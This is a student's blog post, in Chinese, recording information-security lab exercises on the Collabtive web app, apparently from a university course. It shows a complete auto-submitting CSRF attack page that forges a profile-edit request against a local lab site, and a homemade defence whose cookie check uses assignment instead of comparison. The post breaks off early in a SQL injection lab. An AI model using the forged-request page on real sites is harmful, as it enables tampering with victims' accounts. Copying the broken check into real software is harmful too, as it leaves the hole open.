<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    <meta name="keywords" content="信息安全实验课程二实验记录, ShiQuLiZhi BLOG">
    <meta name="description" content="世界很暗，但是你来了">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>信息安全实验课程二实验记录 | ShiQuLiZhi BLOG</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 6.2.0"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>


    
        <style>
    body{
       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
       background-repeat:no-repeat;
       background-size:cover;
       background-attachment:fixed;
    }
</style>

            

                <body>

                    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">ShiQuLiZhi BLOG</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/goodpapers" class="waves-effect waves-light">
      
      <i class="fas fa-coffee" style="zoom: 0.6;"></i>
      
      <span>收藏</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友链</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">ShiQuLiZhi BLOG</div>
        <div class="logo-desc">
            
            世界很暗，但是你来了
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/goodpapers" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-coffee"></i>
			
			收藏
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友链
		</a>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

                        
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">信息安全实验课程二实验记录</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">
                                    <span class="chip bg-color">
                                        信息安全
                                    </span>
                                </a>
                                
                                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
                                    <span class="chip bg-color">
                                        网络安全
                                    </span>
                                </a>
                                
                                <a href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/">
                                    <span class="chip bg-color">
                                        软件安全
                                    </span>
                                </a>
                                
                        </div>
                        
                </div>
                <div class="col s5 right-align">
                    
                        <div class="post-cate">
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                                <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B/" class="post-category">
                                    信息安全专业课程
                                </a>
                                
                        </div>
                        
                </div>
            </div>

            <div class="post-info">
                
                    <div class="post-date info-break-policy">
                        <i class="far fa-calendar-minus fa-fw"></i>
                        发布日期:&nbsp;&nbsp;
                            2023-01-05
                    </div>
                    

                        
                            <div class="post-date info-break-policy">
                                <i class="far fa-calendar-check fa-fw"></i>
                                更新日期:&nbsp;&nbsp;
                                    2023-04-24
                            </div>
                            

                                
                                    <div class="info-break-policy">
                                        <i class="far fa-file-word fa-fw"></i>
                                        文章字数:&nbsp;&nbsp;
                                            12.8k
                                    </div>
                                    

                                        
                                            <div class="info-break-policy">
                                                <i class="far fa-clock fa-fw"></i>
                                                阅读时长:&nbsp;&nbsp;
                                                    49
                                                        分
                                            </div>
                                            

                                                
            </div>
        </div>
        <hr class="clearfix">

        
            <!-- 是否加载使用自带的 prismjs. -->
            <link rel="stylesheet" href="/libs/prism/prism.css">
            

                
                    <!-- 代码块折行 -->
                    <style type="text/css">
                        code[class*="language-"],
                        pre[class*="language-"] {
                            white-space: pre-wrap !important;
                        }
                    </style>
                    

                        <div class="card-content article-card-content">
                            <div id="articleContent">
                                <h1 id="实验一-Collabtive系统跨站请求伪造实验-选题3"><a href="#实验一-Collabtive系统跨站请求伪造实验-选题3" class="headerlink" title="实验一 Collabtive系统跨站请求伪造实验(选题3)"></a>实验一 Collabtive系统跨站请求伪造实验(选题3)</h1><h2 id="第一章-实验环境说明"><a href="#第一章-实验环境说明" class="headerlink" title="第一章 实验环境说明"></a>第一章 实验环境说明</h2><p>实验环境为 <code>Ubuntu 12.04</code>，在蚁景云平台中完成。</p>
<h2 id="第二章-Collabtive系统跨站请求伪造实验过程"><a href="#第二章-Collabtive系统跨站请求伪造实验过程" class="headerlink" title="第二章 Collabtive系统跨站请求伪造实验过程"></a>第二章 Collabtive系统跨站请求伪造实验过程</h2><h3 id="2-1-实验任务及目的"><a href="#2-1-实验任务及目的" class="headerlink" title="2.1 实验任务及目的"></a>2.1 实验任务及目的</h3><p><strong>实验任务</strong>：</p>
<ol>
<li>配置可信网站和恶意网站；</li>
<li>实现攻击者进行 <code>CSRF</code> 攻击；</li>
<li>实现对 <code>CSRF</code> 攻击的防御。</li>
</ol>
<p><strong>实验目的</strong>：</p>
<ol>
<li>理解跨站点请求伪造 (CSRF) 攻击的基本原理；</li>
<li>使用CSRF攻击来攻击社交网络 Web 应用程序，体会CSRF攻击带来的巨大危害。</li>
</ol>
<h3 id="2-2-实验方案设计"><a href="#2-2-实验方案设计" class="headerlink" title="2.2 实验方案设计"></a>2.2 实验方案设计</h3><p><strong>实验场景</strong>：用户浏览器，可信任的Web网站及恶意Web网站。</p>
<p><strong>实验原理</strong>：</p>
<p>CSRF（Cross Site Request Forgery，跨域请求伪造）的示意图如下所示：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221122183608944.png" alt="image-20221122183608944"></p>
<p>从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤：</p>
<p>1.登录受信任网站A，并在本地生成Cookie。</p>
<p>2.在不登出A的情况下，访问恶意网站B。</p>
<p>常见的CSRF攻击包括使用 <code>GET</code> 请求和 <code>POST</code> 请求进行 CSRF 攻击。</p>
<p>为了防御 CSRF 攻击，Web 应用程序可以在其页面中嵌入一个秘密令牌，或添加验证文件。</p>
<p>在本实验中，我们模拟攻击者完成 <code>CSRF</code> 攻击的过程，并对攻击进行相应防御。</p>
<h3 id="2-3-实验过程记录"><a href="#2-3-实验过程记录" class="headerlink" title="2.3 实验过程记录"></a>2.3 实验过程记录</h3><h4 id="（1）实验任务一"><a href="#（1）实验任务一" class="headerlink" title="（1）实验任务一"></a>（1）实验任务一</h4><p>启动 <code>apache</code> 服务：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221127155249680.png" alt="image-20221127155249680"></p>
<p>配置DNS：</p>
<p>将 <code>hosts</code> 文件设置为可写权限：<code>sudo chmod 777 /etc/hosts</code>，其是用来配置 <code>ip</code> 地址和其对应主机名的文件；</p>
<p>然后修改 <code>hosts</code> 文件，分别添加一个可信网站<a target="_blank" rel="noopener" href="http://www.csrflabcollabtive.com,一个恶意网站www.csrflabattacker.com/">www.csrflabcollabtive.com，一个恶意网站www.csrflabattacker.com</a></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221127155219877.png" alt="image-20221127155219877"></p>
<p>配置可信网站和恶意网站：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/apache2/sites-enabled/000-default<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>VirtualHost</span> <span class="token attr-name"><span class="token namespace">*:</span>80</span><span class="token punctuation">></span></span>
    ServerName http://www.csrflabattacker.com
    DocumentRoot /var/www/CSRF/Attacker/
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>VirtualHost</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>VirtualHost</span> <span class="token attr-name"><span class="token namespace">*:</span>80</span><span class="token punctuation">></span></span>
    ServerName http://www.csrflabcollabtive.com
    DocumentRoot /var/www/CSRF/Collabtive/
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>VirtualHost</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221127155513384.png" alt="image-20221127155513384"></p>
<p>访问测试：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221127160313499.png" alt="image-20221127160313499"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221127160340761.png" alt="image-20221127160340761"></p>
<h4 id="（2）实验任务二"><a href="#（2）实验任务二" class="headerlink" title="（2）实验任务二"></a>（2）实验任务二</h4><p>访问 <a target="_blank" rel="noopener" href="http://www.csrflabcollabtive.com并进行登录,登录的用户为/">www.csrflabcollabtive.com并进行登录，登录的用户为</a> <code>admin</code>，密码为 <code>admin</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221127160424640.png" alt="image-20221127160424640"></p>
<p>我们登录了网站，当我们希望可以修改别人的用户时，我们需要知道修改数据时的数据流，这个时候我们可以使用firefox浏览器自带的LiveHttpHeader插件来进行抓包获取修改用户时候的http消息；<br>点击菜单栏tools-LiveHttpHeader，然后访问编辑用户页面，并保存。</p>
<p>使用httpliveheader抓取此过程中的数据包：</p>
<p>通过抓包分析：<a target="_blank" rel="noopener" href="http://www.csrflabcollabtive.com/manageuser.php?action=edit%E6%AD%A4%E8%BF%9E%E6%8E%A5%E6%98%AF%E7%94%A8%E6%9D%A5%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E7%9A%84%E3%80%82%E5%85%B6%E4%B8%AD%E7%94%A8%E6%88%B7id%EF%BC%8C%E5%90%8D%E7%A7%B0name%EF%BC%8C%E5%85%AC%E5%8F%B8company%EF%BC%8C%E9%82%AE%E7%AE%B1email%E7%AD%89%E7%AD%89%E4%BF%A1%E6%81%AF%E6%88%91%E4%BB%AC%E9%83%BD%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9POST%E4%B8%AD%E5%AF%B9%E5%BA%94%E7%9A%84%E5%8F%82%E6%95%B0%E5%8D%B3%E5%8F%AF%E3%80%82">http://www.csrflabcollabtive.com/manageuser.php?action=edit此连接是用来修改用户信息的。其中用户id，名称name，公司company，邮箱email等等信息我们都可以通过修改POST中对应的参数即可。</a></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221127161421514.png" alt="image-20221127161421514"></p>
<p>尝试在攻击者的网站来修改admin用户的资料。我们构造一个攻击页面，来完成修改admin用户的资料(公司名)：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span> This page forges an HTTP POST request. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
        <span class="token keyword">function</span> <span class="token function">post</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> fields</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">var</span> p <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            p<span class="token punctuation">.</span>action <span class="token operator">=</span> url<span class="token punctuation">;</span> p<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> fields<span class="token punctuation">;</span> p<span class="token punctuation">.</span>target <span class="token operator">=</span> <span class="token string">'_self'</span><span class="token punctuation">;</span> p<span class="token punctuation">.</span>method <span class="token operator">=</span> <span class="token string">'post'</span><span class="token punctuation">;</span>
            document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
            p<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">function</span> <span class="token function">csrf_hack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">var</span> fields<span class="token punctuation">;</span>
            fields <span class="token operator">+=</span> <span class="token string">"&lt;input type='hidden' name='name' value='admin'>"</span><span class="token punctuation">;</span>
            fields <span class="token operator">+=</span> <span class="token string">"&lt;input type='hidden' name='userfile' value=''>"</span><span class="token punctuation">;</span>
            fields <span class="token operator">+=</span> <span class="token string">"&lt;input type='hidden' name='company' value='seed'>"</span><span class="token punctuation">;</span>
            <span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'http://www.csrflabcollabtive.com/manageuser.php?action=edit'</span><span class="token punctuation">,</span> fields<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> 
        window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">csrf_hack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将上面的代码保存为index.html并放在&#x2F;var&#x2F;www&#x2F;CSRF&#x2F;Attacker&#x2F;文件夹下。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chmod</span> <span class="token number">777</span> index.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>修改完成后，我们重启 <code>apache</code> 服务：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">service</span> apache2 restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>admin用户还登录状态时，打开浏览器另外一个标签页去访问<a target="_blank" rel="noopener" href="http://www.csrflabattacker.com,攻击代码就会对admin用户的资料信息进行修改./">www.csrflabattacker.com，攻击代码就会对admin用户的资料信息进行修改。</a></p>
<p>再次返回<a target="_blank" rel="noopener" href="http://www.csrflabcollabtive.com,查看用户资料对比之前的页面,发现公司信息被修改了/">www.csrflabcollabtive.com，查看用户资料对比之前的页面，发现公司信息被修改了</a></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221127162648990.png" alt="image-20221127162648990"></p>
<h4 id="（3）实验任务三"><a href="#（3）实验任务三" class="headerlink" title="（3）实验任务三"></a>（3）实验任务三</h4><p>编辑验证文件：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /var/www/CSRF/Collabtive/templates/standard/edituserform.tpl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>选定一个位置添加如下代码：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sid<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在提交处，将 cookie 赋值给 sid。修改如下代码：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>form<span class="token punctuation">.</span>sid<span class="token punctuation">.</span>value<span class="token operator">=</span>document<span class="token punctuation">.</span>cookie</span><span class="token punctuation">"</span></span></span> <span class="token special-attr"><span class="token attr-name">onfocus</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">blur</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>&#123;#send# &#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>按 esc 然后输入 :wq 保存并退出。</p>
<p>然后修改 <code>/var/www/CSRF/Collabtive/manageuser.php</code> 文件，在里面添加如下代码：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sid</span> <span class="token operator">=</span> getArrayVal<span class="token punctuation">(</span><span class="token variable">$_POST</span>,<span class="token string">"sid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>还需要添加如下代码：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span>$_COOKIE<span class="token punctuation">[</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">]</span><span class="token operator">=</span>$sid<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 	<span class="token comment">// 添加在 203 行处</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这一行是对用户的 <code>id</code> 值进行判断，是否等于 <code>phpsessid</code> 的值，如果相等就可以对用户进行编辑，这样当攻击者想攻击时，就不能通过验证了。在这里，<code>if</code> 需要对整个编辑内容进行判断。</p>
<p>编辑截图如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221127163109506.png" alt="image-20221127163109506"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221127163335689.png" alt="image-20221127163335689"></p>
<p>修改上述内容，再次访问<a target="_blank" rel="noopener" href="http://www.csrflabattacker.com网站,可以发现,攻击者由于无法获得第三方网站的/">www.csrflabattacker.com网站，可以发现，攻击者由于无法获得第三方网站的</a> <code>cookie</code> ，其将无法正确完成跨站请求伪造。</p>
<h3 id="2-4-实验结果分析"><a href="#2-4-实验结果分析" class="headerlink" title="2.4 实验结果分析"></a>2.4 实验结果分析</h3><p>在本实验中，我们模拟了攻击者对网站进行的 <code>CSRF</code> 攻击，并通过加入验证 <code>cookie</code> 的方法，对 <code>CSRF</code> 攻击进行了相应防御。与跨站脚本攻击（<code>XSS</code>）相比，<code>XSS</code> 利用的是用户对指定网站的信任，<code>CSRF</code> 利用的是网站对用户网页浏览器的信任。</p>
<h2 id="第三章-结论与心得"><a href="#第三章-结论与心得" class="headerlink" title="第三章 结论与心得"></a>第三章 结论与心得</h2><p>通过本实验，我对CSRF攻击有了一个直观的感受，并理解了其在网络环境中带来的巨大危害；同时，也复习了JavaScript前端Web技术的相关知识，编写了利用POST请求进行CSRF攻击的相应代码。我们在今后的Web相关设计中，必须考虑到这些安全问题，并采取相应的防范措施。</p>
<h1 id="实验二-Collabtive系统SQL注入实验-选题5"><a href="#实验二-Collabtive系统SQL注入实验-选题5" class="headerlink" title="实验二 Collabtive系统SQL注入实验(选题5)"></a>实验二 Collabtive系统SQL注入实验(选题5)</h1><h2 id="第一章-实验环境说明-1"><a href="#第一章-实验环境说明-1" class="headerlink" title="第一章 实验环境说明"></a>第一章 实验环境说明</h2><p>实验环境为 <code>Ubuntu 12.04</code>，在蚁景云平台中完成。</p>
<h2 id="第二章-Collabtive系统SQL注入实验过程"><a href="#第二章-Collabtive系统SQL注入实验过程" class="headerlink" title="第二章 Collabtive系统SQL注入实验过程"></a>第二章 Collabtive系统SQL注入实验过程</h2><h3 id="2-1-实验任务及目的-1"><a href="#2-1-实验任务及目的-1" class="headerlink" title="2.1 实验任务及目的"></a>2.1 实验任务及目的</h3><p><strong>实验任务</strong>：</p>
<ol>
<li>实现对Select、Update语句中的SQL注入；</li>
<li>实现对SQL注入攻击的防范。</li>
</ol>
<p><strong>实验目的</strong>：</p>
<ol>
<li><p>复习 SQL 语言进行数据库操作的方法；</p>
</li>
<li><p>利用 SQL 注入漏洞的方法，演示攻击可能造成的损害，并掌握有助于防御此类攻击的技术。</p>
</li>
</ol>
<h3 id="2-2-实验方案设计-1"><a href="#2-2-实验方案设计-1" class="headerlink" title="2.2 实验方案设计"></a>2.2 实验方案设计</h3><p><strong>实验场景</strong>：用户浏览器，含有SQL注入漏洞的网站</p>
<p><strong>实验原理</strong>：</p>
<p>​    SQL注入攻击是通过将恶意的 SQL查询或添加语句插入到应用的输入参数中，再在后台 SQL服务器上解析执行进行的攻击，它是目前黑客对数据库进行攻击的最常用手段之一。具体而言，SQL注入可分为五大类，分别是：数字型注入、字符型注入、搜索型注入、in型的注入、句语连接型注入。</p>
<p>​    SQL 注入带来的威胁主要有：</p>
<ol>
<li><p>猜测后台数据库，这是利用最多的方式，盗取网站的敏感信息；</p>
</li>
<li><p>绕过认证，列如绕过验证登录网站后台；</p>
</li>
<li><p>注入可以借助数据库的存储过程进行提权等操作。</p>
</li>
</ol>
<p>代码层防御SQL注入攻击的最佳方案就是SQL预编译，将参数与查询分离。</p>
<p>在本实验中，我们模拟攻击者对网站完成SQL注入攻击，并对攻击进行相应防御。</p>
<h3 id="2-3-实验过程记录-1"><a href="#2-3-实验过程记录-1" class="headerlink" title="2.3 实验过程记录"></a>2.3 实验过程记录</h3><h4 id="（1）实验任务一-1"><a href="#（1）实验任务一-1" class="headerlink" title="（1）实验任务一"></a>（1）实验任务一</h4><p>修改 <code>hosts</code> 文件：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>加入如下条目：</p>
<pre class="line-numbers language-none"><code class="language-none">127.0.0.1 www.sqllabcollabtive.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>修改php的配置文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/php5/apache2/php.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>把 <code>magic_quotes_gpc=On</code> 改为 <code>magic_quotes_gpc = Off</code>，表示写入数据库的字符串未经过任何过滤处理。从数据库读出的字符串也未作任何处理。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221127164825194.png" alt="image-20221127164825194"></p>
